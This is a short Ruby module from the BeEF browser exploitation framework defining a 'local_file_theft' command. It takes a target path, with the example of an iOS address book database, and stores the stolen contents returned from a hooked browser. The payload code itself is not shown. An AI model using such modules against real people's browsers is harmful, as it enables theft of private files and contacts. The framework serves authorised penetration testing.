#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# local_file_theft
#
# Shamelessly plagurised from kos.io/xsspwn

class Local_file_theft < BeEF::Core::Command

  def self.options
    return [
        {'name' => 'target_file', 
         'description' => 'The full path to the local file to steal e.g. file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb', 
         'ui_label' => 'Target file',
         'value' => 'autodetect'
         } 
    ]
  end
 
   def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end 
  
end
